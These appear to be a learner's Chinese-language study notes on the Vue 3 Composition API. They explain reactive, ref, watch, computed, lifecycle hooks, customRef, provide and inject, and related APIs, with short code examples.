- proxy的getter 和 setter 和 defineProperty 中的getter setter对比：
- defineProperty中的getter 和 setter得多次为代理对象中多次添加属性 同时为每一个属性对应一套getter和setter
- 而 proxy 中的getter setter一套为其所代理的所有属性服务

<!-- 
  let person = {
    name: "张三",
    age: 18
  }

  const p = new Proxy(person, {

    当有人读取了p中的属性的时候 我们将源对象中的属性返回出去
    get(target, propName) {
      console.log("我要做响应式的逻辑了")
      return target[propName]
    },

    当有人修改 或往 p中追加新属性的时候该方法会被调用
    set(target, propName, value) {
      console.log("我要做响应式的逻辑了")
      target[propName] = value
    },

    当有人删除了p中的属性的时候该方法会被调用 内部我们使用delete关键字删除属性
    deleteProperty(target,propName) {
      
      delete这个关键字删除属性的时候是有返回值的 我们可以将删除结果的返回值返回出去 
      console.log("我要做响应式的逻辑了")
      return delete target[propName]
    }
  }) 
 -->

- 上面的get set deleteProperty方法中我们是通过下面的方修改了源数据 person
<!-- 
  return target[propName]         getter
  target[propName] = value        setter
  return delete target[propName]  deleteProperty
 -->

- 但是vue3在底层并不是这么简单的修改了源数据的
- 在此之前 我们再了解一下 window身上的另一个方法 Reflect 它也可以直接使用
> Reflect.get(想从哪个对象上获取属性, '获取什么属性')
> Reflect.set(想从哪个对象上修改属性, '修改什么属性', '修改为什么值')
> Reflect.deleteProperty(想从哪个对象上删除属性, '删除什么属性')
- 也就是说 我们对 对象的增删改查还可以通过这个api
<!-- 
  ecma现在要把Object身上的很多方法移植到Reflect身上 比如Reflect身上也有defineProperty方法 而且Reflect身上的defineProperty方法是有返回值的
 -->

- vue3在做响应式处理的时候 并不是通过 .的方式去读取属性 或者 给属性赋值 而是使用 Reflect的方式
<!-- 
  const p = new Proxy(person, {

    get(target, propName) {
      console.log("我要做响应式的逻辑了")
      return Reflect.get(target, propName)
    },

    set(target, propName, value) {
      console.log("我要做响应式的逻辑了")
      Reflect.set(target, propName, value)
    },

    deleteProperty(target,propName) {
      console.log("我要做响应式的逻辑了")
      return Reflect.deleteProperty(target, propName)
    }
  }) 
 -->


> 总结：
- 通过 Proxy： 拦截对象中任意属性的变化 包裹 属性值的读写 属性的添加 属性的删除等

- 通过 Reflect： 对被代理对象(源对象)的属性进行操作


> reactive 和 ref 的区别
- 从定义数据角度对比：
  - ref用来定义： 基本类型数据
  - reactive用来定义： 对象 或 数组 类型的数据

- 备注：
- ref也可以用来定义对象类型数据 它背部会自动通过reactive转为代理对象


- 从原理角度对象
- ref通过Object.defineProperty的get set来实现响应式 数据劫持
- reactive通过使用proxy来实现响应式 并通过Reflect操作源对象内部的数据


- 从使用角度对比：
- ref定义的数据： 操作数据需要.value 读取数据时模板中直接读取不需要.value
- reactive定义的数据： 操作数据与读取数据 均不需要.value


> 技巧：
- 基本类型的数据也可以使用 reactive 来解决 这样就不用.value
<!-- 
  let data = reactive({
    person: {
      name: 'sam',
      age: 18
    },
    student: {

    }
  })
 -->

- 我们将所有的数据都放在data这个 然后用reactive来处理这个对象 这样不就行了么 而且还像以前的data配置项

--------------------------

### setup的相关注意点：
- 在vue2中我们使用props向子组件传递数据的时候，子组件需要定义props配置项来声明接收, 也就是父组件使用props传递数据，那子组件就要在props配置项中声明接收

<!-- 
  // App组件
  <Demo name="张三">

  Demo组件
  export default {
    name: "Demo",
    props: ["name"]
  }
 -->

> 补充一些vue2中没有讲到的知识点：
> $attrs
- 这个属性在vc身上
- $attrs 有点像捡漏的 props声明接收的部分 它捡不到 没声明接收的部分就在它那

- 但是还有一个知识点前面我们没有了解过，就是子组件中我们不利用props配置项来声明接收父组件传递过来的参数，这个数据也会在vc身上
<!-- 
  我们可以通过 this 看到 在 $attrs 身上
 -->

- 这种方式也可以使用父组件通过props传递过来的数据 但是这种方式没有办法对传递过来的数据进行类型限制

- 如果我们在子组件使用props配置项声明接收后，我们就可以在模板中直接使用了 但是如果我们不接收的话，在模板中使用的时候 就要 $attrs.name 这种方式使用

- 如果我们在子组件中声明接收了 那么数据就会挂载在vc身上 $attrs 中就会没有，如果没有声明接收 那么数据就会在 $attrs 中


> $slots
- 这个属性也在vc身上
- 插槽的概念：
- 简单的说下 就是子组件中我们可以定义插槽，然后调用该组件的父组件 可以在子组件中的标签体部分 填入内容

- 如果 子组件中 没有定义插槽 那么 父组件中填入的内容就会在 vc身上的 $slots 属性中
<!-- 
  在$slots中的数据是Vnode 一旦我们在子组件中使用<slot>标签挖了坑后
  那么 $slots 中的虚拟节点就会变成真实的DOM节点
 -->

- $slots：我们可以在子组件中的 $slots 属性中 取出父组件传递过来的插槽内容


> 转到 vue3 的知识点：

> setup的执行时机
- 在beforeCreate之前执行一次，this是undefined 也就是说setup函数中不可以写this
<!-- 
  beforeCreate是vue2中最早的钩子函数，但是setup执行的时机比它还要早
 -->


> setup的参数
- props： 
    - 值为对象，包含：组件外部传递过来的且组件内部声明接收了的属性
<!-- 
  当父组件中使用props 向子组件中传递数据的时候
  1. 子组件要先使用props配置项声明接收数据
  2. 在setup函数中的第一个参数内部就能收到这两个数据 并且是proxy对象

  // 父组件
  <Demo name="erin" age="18"/>

  // 子组件
  <h3>{{name}}--{{age}}</h3>

  export default {
    name: 'Demo',
    
    // 1. 先在props配置项中声明接收
    props: ["name", "age"],

    setup(props) {
      // 然后就可以从props中收到并使用
      let {name, age} = props
      console.log(name, age)
  }
 -->

- context： 
    - 上下文对象 它就是一个普普通通的object对象 它有三个属性

    - attrs：
      值为对象，包含：props配置项里没有接收的数据，就会保存在attrs对象中 相当于 this.$attrs

    - slots：
      收到的插槽内容 相当于 this.$slots

      **注意：**
      - vue3中要使用具名插槽的时候 <template v-slot:插槽名>
      - vue3只支持上面的方式
      <!-- 
        <Demo @hello="showInfo" name="erin" age="18">
          <template slot="left" / #left>
            <span>我是填入的内容</span>
          </template>
        </Demo>

        // 子组件
        <slot name="left"></slot>
       -->

    - emit:
      分发自定义事件的函数 相当于 this.$emit
      用于在setup中的方法，要发射自定义事件的时候，我们可以使用context.emit来完成

      **注意：**
      - 因为 父组件需要在子组件标签中绑定自定义事件
      <Demo @hello="showInfo" name="erin" age="18"/>

      - vue3中要求 在子组件中要使用 emits 配置项 声明接收hello事件
      emits: ["hello"]   它跟methods同级
    <!-- 
      比如 子组件给父组件发射一个自定义事件

      props: ["name", "age"],
      emits: ["hello"],

      setup(props, context) {

        // 当点击子组件中的按钮的时候 将自定义事件hello发送给父组件
        function test() {
          context.emit('hello', 666)
        }

        return {
          person,
          test
        }
      }


      // 父组件
      <template>
        <Demo @hello="showInfo" name="erin" age="18"/>
      </template>
     -->

--------------------------

### vue3中的计算属性 与 监视
- 虽然不建议这么做 但还是要说下 在vue3中在写计算属性的时候是可以按照vue2中的方式来写

- vue3中将计算属性变成了组合式的api 我们要是需要使用计算属性的时候 需要引入
- import {computed} from 'vue'
<!-- 
  vue2中是写各种的配置项
  vue3中必须要先引入
 -->

> 使用方式：
- 1. 先从vue中引入 computed
- 2. 定义计算属性 并且属性值部分使用 computed函数 内部传入回调
- vue3中 计算属性也在 setup函数内部来定义
- 回调中的书写方式和vue2中一样

> 简写形式：
<!-- 
  let fullName = computed(() => {
    return person.firstName + '-' + person.lastName
  })

  <template>
    <h3>我是Demo组件</h3>
    姓： <input type="text" v-model="person.firstName"> <br>
    名： <input type="text" v-model="person.lastName"> <br>
    <span>全名：{{fullName}}</span> 
  </template>

  <script>
  import {computed, reactive, ref} from "vue"

  export default {
    name: 'Demo',

    setup() {

      let person = reactive({
        firstName: "张",
        lastName: "三",
      })

      let fullName = computed(() => {
        return person.firstName + '-' + person.lastName
      })

      return {
        person,
        fullName
      }
    },
  }
  </script>
 -->


> 完整形式：
<!-- 
  let fullName = computed({
    get() {
      return person.firstName + '-' + person.lastName
    },

    set(value) {
      const nameArr = value.split("-")
      person.firstName = nameArr[0]
      person.lastName = nameArr[1]
    } 
  })
 -->


> 技巧：
- 我们可以在setup中任何一个需要属性的地方使用这种方式将该属性变为计算属性
<!-- 
  let fullName = computed(() => {
    return person.firstName + '-' + person.lastName
  })

  上面还可以这样：

  person.fullName = computed(() => {
    return person.firstName + '-' + person.lastName
  })
 -->


> watch函数
- 它跟vue2中watch配置功能是一致的

- 先简单的复习一下 vue2 中的监视如果使用
<!-- 
  // vue2中 简写的方式：
  watch: {
    sum(newValue, oldValue) {
      console.log(newValue, oldValue)
    }
  },

  // vue2中 完整的写法：
  watch: {
    immediate: true,
    deep: true,
    sum: {
      handler(newValue, oldValue) {
        console.log(newValue, oldValue)
      }
    }
  },
 -->


- 我们再来看看vue3中的watch怎么使用 vue3中的watch也是组合api 组合api都是vue中内置的一些函数 我们要是想使用的话 需要提前引入


> vue3 中 watch的使用方式
- 监视属性也是在 setup 函数中书写 监视属性写成一个函数调用的形式 第一个参数为监视谁，第二个参数为回调，当监视的属性发生变化的时候 回调中的逻辑就会被调用

- watch() 不用创建什么变量去接返回值

> 1. 引入
- import {watch} from 'vue'

> 2. watch(要监视的属性, (n, o) => { })
> 情况一 和 二： 监视ref定义的一个 或 多个响应式数据
<!-- 
  // 监视ref定义的一个响应式数据
  setup() {
    let sum = ref(0)

    watch(sum, (newValue, oldValue) => {
      console.log(newValue, oldValue)
    })

    return {
      sum
    }
  },


  // 监视ref定义的多个响应式数据
  let sum = ref(0)
  let msg = ref("你好啊")

  watch(sum, (newValue, oldValue) => {
    console.log(newValue, oldValue)
  })

  watch(msg, (newValue, oldValue) => {
    console.log(newValue, oldValue)
  })
 -->

- 从上面我们能看出vue2和vue3中的 关于watch的一个区别 vue2中我们只能写一个监视属性(因为watch是一个配置项 没办法写2个一样配置项)，但是vue3中我们可以多次调用watch函数来监听多个属性

- 当监视多个属性的时候 我们可以将watch函数的第一个参数 写成一个数组
> watch([监视数据1, 监视数据2], (新值数组，旧值数组) => { })
<!-- 
  let sum = ref(0)
  let msg = ref("你好啊")

  watch([sum, msg], (newValue, oldValue) => {
    console.log(newValue, oldValue)
  })

  newValue： 是一个装有监视属性新值的数据
  [1, '你好啊']

  oldValue： 是一个装有监视属性旧值的数据
  [0, '你好啊']
 -->


> vue3中 将deep 和 immediate等配置放在了watch函数的第三个参数的位置
> watch(要监视的属性, (n, o) => { }, {配置对象})
<!-- 
  watch([sum, msg], (newValue, oldValue) => {
    console.log(newValue, oldValue)
  }, {
    deep: true,
    immediate: true
  })
 -->


- 上面介绍的都是使用ref函数定义的基本类型的数据 那如果是reactive函数定义的对象怎么办？

> 情况三：监视reactive所定义的一个响应式数据中的全部属性
<!-- 
  let person = reactive({
    name: "erin",
    age: 18
  })

  watch(person, (n, o) => {
    console.log("person变化了", n, o)
  })
  注意： 当我们输出newValue 和 oldValue 的时候发现n 和 o是一样的
 -->

**注意：**
- 当我们将reactive所定义的数据交给watch去监视的时候 我们没办法获取正确的oldValue值 它会和newValue是一样的

- 当reactive所定义的对象类型的数据里面还有对象的时候 vue3在watch里面强制开启了deep深度监视 而且关不上


> 情况四：监视reactive所定义的一个响应式数据中的某个属性
- 比如： 我只想监视person中的age属性 怎么写？
- 我们要将watch函数的第一个参数定义成一个函数 返回值为 reactive所定义的对象中的属性
<!-- 
  watch(() => person.name, (n, o) => {
    console.log("person变化了", n, o)
  })

  注意： 这里的n o都是正确的
 -->


> 情况五：监视reactive所定义的一个响应式数据中的某些属性 
- 我们将监视一个reactive所定义的数据中多个属性 写成一个数组
<!-- 
  watch([() => person.name, () => person.age], (n, o) => {
    console.log("person变化了", n, o)
  })
 -->


> 特殊情况：
- 当reactive定义的对象中还有对象的时候，我们使用watch监视对象中的对象中的属性的时候，要开启deep深度监视 
- hahaha 太乱了
<!-- 
  let person = reactive({
    name: "erin",
    age: 18,
    job: {
      j: 1
    }
  })

  我们监视job里面的j1的时候 要开启deep深度监视
  watch(() => person.job, (n, o) => {
    console.log("person的job对象变化了")
  }, {deep: true})
 -->


> 两个小坑
- 监视reactive定义的响应式数据时候：
  - oldvalue无法正确获取，强制开启了深度监视(deep配置失效)
  - 当数据是一个基本数据类型的时候oldValue是有效的 当数据是一个对象数据类型的时候 oldValue 是无效的

  - 监视reactive定义的响应式数据中的某个属性时：deep配置有效

--------------------------

### watch时value的问题
- 我们使用watch监视ref定义的数据的时候 用不用.value
- 在上面的案例中我们监视一个ref定义的数据的时候 我们没有.value
<!-- 
  let sum = ref(0)

  watch(sum.value, (newValue, oldValue) => {
    console.log(newValue, oldValue)
  })

  报错 当我们监视 sum.value 的时候会报错 说我们没办法监视一个数0
  当我们想做监视的时候往往是监视的是一个数据结构 

  当我们监视 sum 的时候 我们监视的是 refimpl{...} 这个对象中任何属性的修改我都能监测到
 -->

- 当我们监测的是 let person = ref({name: "sam"}) 的时候
- 注意：
- 这里我们使用的是ref函数定义的数据 当它定义的数据类型是一个对象的时候 内部还是会调用reactive的
- 所以我们使用watch去监视person的时候要 person.value
- 因为 person 是 refimpl对象 person.value 才是我们要监视的 proxy 对象
<!-- 
  watch(person.value, (newValue, oldValue) => {
    console.log(newValue, oldValue)
  })


  // 我们也可以这么写 然后开启深度监视
  watch(person, (newValue, oldValue) => {
    console.log(newValue, oldValue)
  }, {deep: true})
 -->

--------------------------

### watchEffect函数
- 它也是一个组合式的api 所以在使用之间需要引入
- 同时它也是写在setup函数中

> watchEffect(() => { })
- 这个回调上来就会执行一次
- 这个回调中用到了哪些数据 就会监视哪些数据
<!-- 
  watchEffect(() => {
    const x1 = sum.value
    const x2 = person.job.j1.salary

    当x1 x2的值变化的时候 这个回调就会执行
  })
 -->

> 总结：
- watch的套路是：
- 既要指明监视的属性 也要指明监视的回调

- watchEffect的套路是：
- 不用指明监视哪个属性，监视的回调中用到哪个属性 那就监视哪个属性

- watchEffect有点像computed
- 但computed注重的计算出来的值(回调函数的返回值) 所以必须要写返回值
- 而watchEffect更注重的是过程(回调函数的函数体) 所以不用写返回值

--------------------------

### Vue3的声明周期
- beforeUnmount unmounted 最后两个生命周期换了下名字 剩下的并没有太多的改变
<!-- 
  beforeDestroy 改名为 beforeUnmount
  destrory 改名为 unmounted
 -->

- 给目标添加 v-if 后 当不满足条件的时候 该组件会直接被卸载掉

- 要点1：
- 生命周期的写法 可以还像vue2中 写配置项的形式使用生命周期
- 也可以利用组合api的形式将生命周期写在setup中

> 使用组合api的形式 使用生命周期 函数
- vue3也提供了composition Api形式的生命周期钩子 与vue2中钩子对应关系如下
<!-- 
    beforeCreate  -- setup()
    created       -- setup()

    beforeMount   -- onBeforeMount
    mounted       -- onMounted
    beforeUpdate  -- onBeforeUpdate
    updated       -- onUpdated
    beforeUnmount -- onBeforeUnmount
    unmounted     -- onUnmounted
 -->

- 其中 beforeCreate 和 created vue3中并没有给我们提供组合式的api vue3认为setup就相当于 beforeCreate 和 created 所以 这两个生命周期函数 不能放在setup里面

- 而其他的生命周期函数 要想使用组合式api的方式去写 前面要加上 on

- 既然是组合式的api 那我们就要先引入

> 1. 引入 生命周期函数
- import {onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted} from "vue"

- 我们引入的都是函数，它们都可以传递一个回调当做参数 在对应的实际会调用回调
<!-- 
  onBeforeMount(() => { })

  setup() {
    let sum = ref(0)
    onBeforeMount(() => {})
    return {
     
    }
  },
 -->

--------------------------

### 自定义hook函数
- 什么是hook，本质是一个函数 把setup函数中使用的composition api进行了封装 类似vue2中的mixin

- 自定义hook的优势：复用代码 让setup中的逻辑更清楚易懂

- 我们做一个小案例：
- 点击屏幕打印x y的坐标
- 思路：
- 我们等组件挂载完毕的时候 给window绑定点击事件 获取到鼠标的坐标 赋值给数据
<!-- 
  setup() {
    let point = reactive({
      x: 0,
      y: 0
    })

    function savePoint(e) {
      point.x = e.pageX
      point.y = e.pageY
    }

    // 当组件挂载完毕后 我们给window绑定点击事件
    onMounted(() => {
      window.addEventListener("click", savePoint)
    })

    onBeforeUnmount(() => {
      window.removeEventListener("click", savePoint)
    })

    return {
      point
    }
  },
 -->

- 当setup中的逻辑越来越多的时候 我们很容易造成 不知道哪些逻辑是哪个功能
- 比如我们上面创建的功能 当别的组件想复用的时候 难道要复制粘贴么？

- 在这种情况下 我们就可以使用hook

> 1. 在src文件夹下 创建 hooks 文件夹 创建 useXxx.js 文件
- 一般情况下 hooks 里面的文件都叫做use什么什么
<!-- 
  思路：
  我们在usePoint文件中 写逻辑 最后将 App组件需要的数据返回出去
  import {reactive, onBeforeUnmount, onMounted} from 'vue'
  export default function () {
    let point = reactive({
      x: 0,
      y: 0
    })

    function savePoint(e) {
      point.x = e.pageX
      point.y = e.pageY
    }

    // 当组件挂载完毕后 我们给window绑定点击事件
    onMounted(() => {
      window.addEventListener("click", savePoint)
    })

    onBeforeUnmount(() => {
      window.removeEventListener("click", savePoint)
    })

    return {
      point
    }
  }
 -->


> 2. 在App组件中我们引入这个js模块 接收 usePoint 返回出来的数据
<!-- 
  setup() {
    
    let point = usePoint()

    return {
      point
    }
  },
 -->

--------------------------

### toRef
- ref函数前面学过是专门定义一个响应式的数据的 可以接收基本数据类型 和 对象类型

- 我们看一个需求：
- 下面的模板中 我们使用数据的时候 都是通过 person.name 的方式 那能不能再精简一些 也就是说 我想在模板中直接使用 name age salary
<!-- 
  <h3>姓名：{{person.name}}</h3>
  <h3>性别：{{person.age}}</h3>
  <h3>薪资：{{person.job.j1.salary}}k</h3>

  setup() {
    
    let person = reactive({
      name: "erin", age: 18,
      job: { j1: { salary: 20 } }
    })

    return { person }
  },
 -->

- 那我们能不能这么写? 不行 本意我们是希望将 person中的一条数据 交出去 但是 我们这么交出去的数据 只是简单的基本数据类型的赋值 相当于 let a = 1， b = a 他们之间并没有引用关系，不是深拷贝 不是深拷贝的话改变页面上的数据 不会有响应式的变化
<!-- 
  return {
    name: person.name
    age: person.age
    salary: person.job.j1.salary
  }
 -->

- 那怎么办？ 我还想在模板中将代码精简一些 也就是说 我想将 响应式对象person中的一条数据交出去 并且还是响应式的


> toRef(想操作哪个对象， 想要这个对象中的哪个属性)
- 它也是一个组合api 使用的时候需要引入，它的功能就是将不是ref函数定义成响应式的东西转换为是响应式定义的东西

- 作用：
- 创建一个ref对象，其value值指向另一个对象中的某个属性

- 语法：
- const name = toRef(person, 'name')

- 应用：
- 要将响应式对象中的某个属性单独提供给外部使用时 这个属性还不想丢失响应式

<!--  
  let name = toRef(person, "name")

  console.log(name)
  // ObjectRefImpl {_object: Proxy, _key: 'name', __v_isRef: true}

  这个name被包装成了一个refimpl对象 我们要使用的话 得.value来获取值
  当我们读取这个name的时候，它就会去person中读取name属性 像getter

  也就是说像上面那样操作 name: person.name 这种形式不是响应式的 但是我们使用toRef就是响应式的
 -->

**注意：**
- refimpl对象的值 在模板中使用的时候是不需要.value的


- 那接下来 我们是不是可以这么操作
<!-- 
  <h3>姓名：{{name}}</h3>
  <h3>性别：{{age}}</h3>
  <h3>薪资：{{salary}}k</h3>

  setup() {
    
    let person = reactive({
      name: "erin",
      age: 18,
      job: {
        j1: {
          salary: 20
        }
      }
    })

    let name = toRef(person, "name")
    let age = toRef(person, 'age')
    let salary = toRef(person.job.j1, "salary")

    return {
      name,
      age,
      salary
    }
  },
 -->

- 我们使用 toRef 交出去的可以是常用的对象中的某些属性 比如这个对象中有800个属性 那我是不是可以将这3个使用 toRef 的形式交出去，剩下的还是将整个对象交出去呢
<!-- 
  let name = toRef(person, "name")
  let age = toRef(person, 'age')
  let salary = toRef(person.job.j1, "salary")

  return {
    person,
    name,
    age,
    salary
  }
 -->


- 还有需要注意的地方
- 假如我们使用的是ref函数包裹了person的一个数据的时候 这个name就和person中的name没有关系了 是两个对象 所以改变 name 并不会影响到 person.name
<!-- 
  return {
    person,
    name: ref(person.name)
  }
 -->

- 但是如果我们使用的是 toRef 函数包裹的话 他们之间是存在引用关系的 它会去person.name中找

- 也就是说：
- toRef 是引用一个对象中的属性
- ref   是复制一个对象中的属性 成为一个新对象



> 扩展： toRefs(obj)
- toRefs 与 toRef 功能一致，但可以批量创建多个ref对象
- 它不用传递第二个参数 直接将对象传递进去 该对象中的第一层属性都会变成toRef的形式，比如对象中嵌套对象的时候

- 语法：
- toRefs(person)

- 使用 toRefs 将目标对象中的所有属性都变成了 refimpl对象 这样 该对象的所有属性交出去后 都是响应式的 因为在读取交出去的属性的时候 会像getter那样去元数据中读取和修改

- 注意该方法只会把person对象的第一层转换为refimpl对象 嵌套深层次的不会管的 需要通过.来读取

<!--  
  <h3>姓名：{{name}}</h3>
  <h3>性别：{{age}}</h3>
  <h3>薪资：{{job.j1.salary}}k</h3>


  let x = toRefs(person)
  console.log(x)

  return {
    ...x
  }
 -->

--------------------------

### 其它的 组合式 api

> shallowReactive 与 shallowRef
- 既然是组合api 那我们在使用的时候也需要先引入

> shallowReactive
- 只处理对象最外层属性的响应式 (浅响应式)
- 下面的案例中 使用 shallowReactive的结果就是：
- name age job是响应式的，但是job里面的j1 和 salary 不是响应式的
- shallowReactive只考虑对象类型里面的第一层，其它的不做考虑
<!-- 
  import {shallowReactive} from 'vue'
  let person = shallowReactive({
    name: "erin",
    age: 18,
    job: {
      j1: {
        salary: 20
      }
    }
  })
 -->


> shallowRef
- 只处理基本数据类型的响应式，不进行对象的响应式处理
- 当传入 基本数据类型的时候 Ref 和 shallowRef 没有任何区别
<!-- 
  let x = ref(0)   == let x = shallowRef(0)
  let x = ref({})  != let x = shallowRef({})
 -->


> 应用场景
- 如果有一个对象数据，结构比较深，但变化时只是外层属性变化 那我们就用 shallowReactive
- 

- 如果一个对象数据，后续功能不会修改该对象中的属性 而是生新的对象来替换 那我们就用shallowRef

--------------------------

### readonly 与 shallowReadonly
- 组合式api记得要先引入哦
- 这两个api的意义就是给我一个数据 我让它变成只读的
- 它可以对reactive 和 ref 函数生成的响应式数据 进行加工 变成只读

- 场景：
- 当我们如下定义数据的时候 都是响应式的
- 但有些时候 我不希望你修改sum 和 person 这个时候我们就可以借助 readonly 了
<!-- 
  let sum = ref(0)
  let person = shallowReactive({
    name: "erin",
    age: 18,
    job: {
      j1: {
        salary: 20
      }
    }
  })
 -->


- readonly：
- 让一个响应式数据变为只读的(深只读)

- shallowReadonly：
- 让一个响应式数据变为只读的(浅只读)

- 应用场景：
- 不希望数据被修改时 比如 上面person这个响应式的数据 不是我们组件自己定义的
- 也就是说 小刘你用这个数据行 但是你别改 你改了之后我这边受影响
- 那我们就可以收到这份数据的时候 给它变成只读的


> 1. 引入
> 2. person = readonly(person)
- 这样person对象就变成只读的了
- readonly是一个函数 它接收一个响应式的数据 readonly拿到这个响应式的数据 进行加工后 返回一个新的person

- 这个返回的新person里面的所有东西都不允许被修改
<!-- 
  let person = shallowReactive({
    name: "erin",
    age: 18,
    job: {
      j1: {
        salary: 20
      }
    }
  })

  person = readonly(person)

-->

> shallowReadonly 用法和上面的readonly一样 但是它只考虑第一层数据
- 也就是说 当对象类型的数据 嵌套的层次很深的时候 2层以下的还是可以修改的
<!-- 
  let person = shallowReactive({
    name: "erin",
    age: 18,
    job: {
      j1: {
        salary: 20
      }
    }
  })

  person = shallowReadonly(person)

  这时候job里面的j1 和 salary 还是能改的
 -->

--------------------------

### toRaw 与 markRaw
- 组合式的api 你懂的要先干什么

- 我们先思考一个问题
- 我们为什么要将数据使用ref reactive是为了将普通的数据变成响应式的数据
- 但是
- 有些情况下 我们是需要将 响应式的数据 变回普通数据的

- 我们要实现这一点就需要用到 toRaw 函数

> toRaw()
- 作用：
- 将一个由 reactive生成的响应式对象 转为 普通对象
- 注意：
- 它只能处理reactive生成的响应式对象 ref函数生成的不可以

- 使用场景：
- 用于读取响应式对象对应的普通对象 对这个普通对象的所有操作 不会引起页面的更新
- 比如 ajax的时候 传递数据之前对数据进行处理 用 toRaw

<!-- 
  let person = reactive({
    name: "erin",
    age: 18,
    job: {
      j1: {
        salary: 20
      }
    }
  })

  我们将响应式的 person 变回普通对象
  需求：
  - 点击按钮后输出 原始的person

  function showRawPeson() {

    // 我们定义一个中转变量p 用来接收 toRaw的结果
    const p = toRaw(person)
    console.log(p)    // 这个p就是普通对象了
  }
 -->

- 总结：
- reactive像是将原始对象制作成响应式的对象
- toRaw像是还原 就响应式的对象 还原成 普通对象


> markRaw()
- 作用：
- 标记一个对象，使其用于不会再成为响应式对象 里面的属性都不再是响应式了 

- 应用场景：
- 有些值不应该被设置为响应式的 例如： 复杂的第三方类库等
<!-- 
  let person = reactive({
    name: "张三",
    axios
  })

  比如我们想往person里面添加 axios 但是如果这么添加进去 vue会将axios里面的所有数据不管嵌套多深 都会变成响应式的 这样效率会很低
 -->

- 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提供性能
<!-- 
  let car = {name:"奔驰", price: 40}
  person.car = car

  上面的操作 也是响应式的 因为 person是经过 reactive 包装过的 proxy 会监测数据里面的变化 从而做到响应式的处理

  但有的时候 我不希望 car 也是响应式的 car只负责展示就可以了 那这时候我们就可以使用 markRaw()

  person.car = markRaw(car)
  这样添加进去的数据就不是响应式的了 也就是数据还是能该 但是vue不对它做响应式了
 -->

- 这个方法的应用场景会很多 比如第三方的库 比如很大的数据结构 他们仅仅是用来展示的 不需要做响应式

- 这时候我们就先将数据先markRaw一下

--------------------------

### customRef
- 组合式api你懂的
- 作用：
- 创建一个自定义的ref，并对其依赖项跟踪 和 更新触发进行显式控制
- 自定义ref是一个函数

- 案例：
- 页面上有一个input 和 一个呈现数据用的h3，我们在input中输入文字然后1秒钟在h3中做呈现

- customRef 和 ref的区别，ref相当于精装房 customRef属于毛坯房
- ref里面有vue配齐了的东西
- customRef里面需要我们自己去进行加工


> customRef() 的基本使用
- 组合式的api不用说了 第一步要引入
- 1. 引入 
<!-- 
  import {customRef} from 'vue'
 -->

- 2. 在 setup 内部定义 自定义的ref
- 参数：value 为我们传进来的值
<!-- 
  setup() {
    function myRef(value) {

    }
  }
 -->

- 3. 在 setup 内部，将数据使用我们自定定义的ref包裹
<!-- 
  let keyword = myRef("hello")
  我们把数据传入了 我们自定义的函数 myRef 
 -->

- 4. 自定义myRef函数容器内部要有返回值 步骤3中才能创建变量接收
- 自定义myRef函数容器内部 我们使用 customRef() 函数 并将它的结果返回
> customRef((track, trigger) => { return {get, set}})
- 要点：
- 1. customRef() 要传入回调函数
- 2. 回调函数的形参：
  - track() 用于在get中使用 用于通知vue追踪其返回值的变化 当模板中调用或者被修改后 进行对该值的追踪

  - trigger() 用于set中最后调用，通知vue重新解析模板

- 3. 该函数必须返回一个对象，对象中要有get 和 set方法
- get： 有人读取 myRef 中的数据的时候 get会调用
- set： 有人修改 myRef 中的数据的时候 set会调用

- 逻辑：
- 在初始化阶段，模板中读取的是get函数的返回值
- 在更新后阶段，先是将set函数中修改后的数据 赋值给我们传入myRef的value 然后在set中调用trigger() 告诉vue解析模板 然后再在get函数中调用track()让其追踪最新值的变化
<!-- 
  setup(a, b) {

    const myRef = (value) => {

      let timer;

      // 它会返回一个自定义的ref
      let x = customRef((track, trigger) => {
        return {

          // 有人读取 myRef 中的数据的时候 get会调用
          get() {
            console.log("有人从myRef中读取数据了 我把"+value+"给它了")

            // 追踪下keyword的改变 通知vue追踪数据的变化
            track()
            return value  // 3
          },

          // 有人修改 myRef 中的数据的时候 set会调用
          set(newValue) {
            clearTimeout(timer)
            console.log("有人从myRef中修改数据了 我把"+value+"修改了")
            value = newValue    // 1

            // 通知vue重新解析模板 // 2
            // trigger()

            timer = setTimeout(() => {
              trigger()
            }, 1000)
          }
        } 
      })

      // 将我们忙活完的x暴露出去
      return x
    }
 -->

- 上面是防抖操作 等我们输入完了之后 然后再显示在h3中
- 跟计算属性很像 读东西找get 改东西找set 但是就是在关键的时候 调用一些特殊的东西

- 同时我们要在开启一个新的定时器前 关闭上一个定时器

--------------------------

### provide 与 inject
- 组合式api 要先引入

- provide： 提供数据
- inject：  注入数据

- 他们是一种组件间的通信方式 特别适用于 祖孙组件之间通信 

- 祖孙组件也叫做跨级组件 中间隔了一个父
<!-- 
      父            ←  provide
  
  子   子   子

孙  孙  孙  孙  孙   →  inject
 -->
- 通过 provide 将数据给祖组件，通过 inject 从孙组件里面得到数据
- 注意：
- 父使用provide传递的数据 在后代组件中都可以使用inject接收到 包括 子和孙

- 套路：
- 祖组件有一个provide选项来提供数据 后代组件有一个inject选项来开始使用这些数据

- 接下来 我们准备了3个组件 app child son 一个套一个 我们要在app组件中的数据 传递给son组件

> proviede('给传递的数据起个变量名字', 真正的数据)
- 写在setup函数中
<!-- 
  // app组件
  setup() {
    let car = reactive({
      name: "奔驰",
      price: "40w"
    })

    // 给自己的后代组件传递数据
    provide('car', car)

    return {
      ...toRefs(car)
    }
  },
 -->


> inject("父组件中的数据变量名")
- 写在setup函数中
- 我们创建一个变量用来接收数据
- 同时 这个数据还是响应式的
<!-- 
  import {inject} from 'vue'
  export default {
    name: "Son",
    setup() {
      // 我们拿到的是响应式数据
      let car = inject("car")
      
      return {
        car
      }
    }
  }
 -->

--------------------------

### 对响应式数据进行判断的api
- 组合式api

> isRef(目标)
- 检查一个值是否为一个ref对象


> isReactive(目标)
- 检查一个对象是否是由 reactive 创建的响应式代理


> isReadonly(目标)
- 检查一个对象是否是由readonly创建的只读代理


> isProxy(目标)
- 检查一个对象是否是由reactive 或者 readonly 方法创建的代理
- readonly加工后的对象仍然是proxy类型的数据

--------------------------

### 组合式api的优势

> options api 存在的问题
- 使用传统optionsapi中 新增或者修改一个需求，就需要分别在data methods computed里修改
- 也就是说 在vue2中我们要实现一个功能 那么就需要在各种配置项里面写逻辑 一个功能的实现被打散了 当功能越来越多的时候 我们要修改一个需求那么还是要在各种配置项里面修改 找来找去特别的乱


> options api 的优势
- 在组合式api里面我们可以组织我们的代码 函数 让相关功能的代码更加有序的组织在一起
- 还可以用hook来配合操作 想是一块块的 也就是说 要让组合式api发挥威力 必须要借助hook函数

--------------------------

### Fragment组件
